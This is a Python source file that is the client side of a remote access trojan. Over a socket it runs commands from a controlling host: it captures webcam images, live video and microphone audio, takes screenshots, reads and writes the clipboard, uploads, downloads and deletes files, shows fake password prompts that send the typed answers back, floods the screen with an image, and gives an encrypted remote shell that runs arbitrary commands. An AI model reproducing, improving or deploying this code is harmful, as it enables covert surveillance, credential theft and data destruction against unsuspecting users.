from os import listdir, chdir, path, remove, getcwd
import socket
from select import select
import cv2
from json import dumps, loads
from numpy import array, uint8
import pyaudio
from time import sleep
from pyautogui import screenshot
from shutil import rmtree
from cryptography.fernet import Fernet
from subprocess import check_output, STDOUT
from pymsgbox import alert, confirm, prompt, password
from PIL import Image
from platform import machine, version, platform, processor
from platform import system as sys_info
from psutil import disk_usage, virtual_memory
from clipboard import paste, copy


def popup(conn: socket.socket, command: str) -> None:
    parts = command.strip().split("|")
    if len(parts) < 2:
        return

    cmd_type = parts[0][2:8]
    if cmd_type == "alert":
        alert(parts[2], parts[1])
    elif cmd_type == "confr":
        buttons = parts[3].split(",") if len(parts) > 3 else []
        result = confirm(text=parts[2], title=parts[1], buttons=buttons)
        conn.send(result.encode())
    elif cmd_type == "qstion":
        result = prompt(text=parts[2], title=parts[1])
        conn.send(result.encode())
    elif cmd_type == "passwd":
        result = password(text=parts[2], title=parts[1], mask="*")
        conn.send(result.encode())


def hd_alert(conn: socket.socket) -> None:
    data = ""
    while True:
        rc_data = conn.recv(40000).decode()
        if "END" in rc_data[-3:]:
            data += rc_data[:-3]
            break
        data += rc_data
    cv_img = array(loads(data)).astype(uint8)
    img = Image.fromarray(cv_img)
    for _ in range(10000):
        img.show()


def clipboard(command: str, conn: socket.socket) -> None:
    if command == "GCLPB":
        conn.send((paste() + "ENDeyeRT").encode())
    elif command == "WCLPB":
        data = ""
        while True:
            data2 = conn.recv(10000).decode()
            if "ENDeyeRT" in data2:
                data += data2.replace("ENDeyeRT", "")
                break
            data += data2
        copy(data)


def send_info(conn: socket.socket) -> None:
    if "windows" in sys_info():
        root_path = r"C:\\"
    else:
        root_path = "/"
    conn.send(
        f"{disk_usage(root_path)}|{virtual_memory()}|{machine()}|{version()}|{platform()}|{processor()}".encode()
    )


def _decrypt_fs(data: bytes | str, key: bytes) -> bytes:
    if not isinstance(data, bytes):
        data = str(data).encode()
    if data:
        fernet = Fernet(key)
        return fernet.decrypt(data)
    raise AttributeError


def _encrypt_fs(data: bytes | str, key: bytes) -> bytes:
    if not isinstance(data, bytes):
        data = str(data).encode()
    if data:
        fernet = Fernet(key)
        return fernet.encrypt(data)
    raise AttributeError


def shell_rn(conn: socket.socket, key: bytes) -> None:
    conn.settimeout(600)
    while True:
        try:
            command = _decrypt_fs(conn.recv(1024), key).decode().strip()
        except AttributeError:
            continue
        if command == "GTINFO":
            conn.sendall(_encrypt_fs(f"{socket.gethostname()}[{getcwd()}]", key))
        elif "END" in command:
            break
        elif command.startswith("cd"):
            parts = command.split(" ", 1)
            if len(parts) == 1:
                conn.send(_encrypt_fs("So where?", key))
            else:
                try:
                    chdir(parts[1].strip())
                    conn.send(_encrypt_fs("None", key))
                except Exception:
                    conn.send(_encrypt_fs(f"cd: {parts[1].strip()}: No such file or directory", key))
        else:
            if "bash" in command:
                conn.sendall(_encrypt_fs("What do you want from me ?!", key))
            else:
                try:
                    out = check_output(command, stderr=STDOUT, shell=True)
                except Exception as e:
                    out = e
                try:
                    conn.sendall(_encrypt_fs(out, key))
                except AttributeError:
                    conn.sendall(_encrypt_fs("None", key))


def take_scr(conn: socket.socket) -> None:
    scr = screenshot()
    arr = array(scr)
    rgb_list = arr.tolist()
    dmps = dumps(rgb_list)
    conn.send(dmps.encode())


def get_pic(conn: socket.socket) -> None:
    vid = cv2.VideoCapture(0)
    ret, frame = vid.read()
    if ret:
        rgb_list = frame.tolist()
        dmps = dumps(rgb_list)
        conn.send(dmps.encode())


def live(conn: socket.socket) -> None:
    vid = cv2.VideoCapture(0)
    while True:
        ret, frame = vid.read()
        if not ret:
            break
        rgb_list = frame.tolist()
        dmps = dumps(rgb_list)
        conn.sendall(dmps.encode())
        conn.send(b"END")
        flag = conn.recv(1024).decode()
        if flag == "end":
            break
        sleep(0.25)


def rec_sound(conn: socket.socket) -> None:
    chunk = 1024
    sample_format = pyaudio.paInt16
    channels = 2
    fs = 44100
    seconds = int(conn.recv(1024).decode())
    p = pyaudio.PyAudio()
    stream = p.open(format=sample_format, channels=channels, rate=fs, frames_per_buffer=chunk, input=True)
    frames = []
    for _ in range(0, int(fs / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    conn.send(str(p.get_sample_size(sample_format)).encode())
    sleep(0.25)
    for itm in frames:
        conn.send(itm)


def dir_exp(conn: socket.socket, command: str) -> None:
    if command.startswith("FXshf:"):
        fds = ""
        srh_file = command.split(":", 1)[1]
        for fd in listdir():
            if srh_file in fd:
                if path.isdir(fd):
                    fds += "D:"
                else:
                    fds += "F:"
                fds += fd + "\n"
        sleep(0.5)
        conn.send(fds.encode())
    elif command.startswith("FXchd:"):
        new_path = command.split(":", 1)[1]
        try:
            chdir(new_path)
            sleep(0.5)
            conn.send(b" Done !")
        except FileNotFoundError:
            sleep(0.5)
            conn.send(b"The path entered is incorrect !")
    elif command.startswith("FXdwn:") or command.startswith("4FXdwn:"):
        file_path = command.split(":", 1)[1]
        buffer = 4096
        try:
            if path.isfile(file_path):
                file_size = path.getsize(file_path)
                if command.startswith("FXdwn:"):
                    conn.send(str(file_size).encode())
                with open(file_path, "rb") as b_file:
                    while True:
                        rdata = b_file.read(buffer)
                        if not rdata:
                            break
                        conn.sendall(rdata)
                if command.startswith("4FXdwn:"):
                    with open(file_path, "wb") as f:
                        while True:
                            data = conn.recv(buffer)
                            if "END" in str(data[-3:]):
                                f.write(data[:-3])
                                break
                            if not data:
                                break
                            f.write(data)
            else:
                return
        except FileNotFoundError:
            conn.send(b"The path entered is incorrect !")
            return
    elif command.startswith("FXrmf:"):
        file_path = command.split(":", 1)[1]
        if path.isfile(file_path):
            remove(file_path)
            conn.send(b"Done !")
        elif path.isdir(file_path):
            rmtree(file_path)
            conn.send(b"Done !")
        else:
            conn.send(b"Failed! can't find file path !")
    elif command.startswith("FXupd:"):
        buffer = 4096
        file_path = command.split(":", 1)[1]
        try:
            with open(file_path, "wb") as f:
                while True:
                    data = conn.recv(buffer)
                    if "END" in str(data[-3:]):
                        f.write(data[:-3])
                        break
                    f.write(data)
        except IsADirectoryError:
            return


def command_runner(conn: socket.socket, command: str, key: bytes) -> None:
    while True:
        sleep(0.25)
        if command == "Tpict":
            get_pic(conn)
            conn.send(b"END")
            break
        elif command == "Rsound":
            rec_sound(conn)
            conn.send(b"END")
            break
        elif command == "Glive":
            live(conn)
            conn.send(b"END")
            break
        elif command == "Tscr":
            take_scr(conn)
            conn.send(b"END")
            break
        elif command.startswith("FX") or command.startswith("4FX"):
            dir_exp(conn, command)
            conn.send(b"END")
            break
        elif command == "RMCM":
            shell_rn(conn, key)
            conn.send(b"END")
            break
        elif command.startswith("WN"):
            popup(conn, command)
            conn.send(b"END")
            break
        elif command == "HDalert":
            hd_alert(conn)
            conn.send(b"END")
            break
        elif command in ("GCLPB", "WCLPB"):
            clipboard(command, conn)
            break
        elif command == "Sinfo":
            send_info(conn)
            conn.send(b"END")
            break
        else:
            break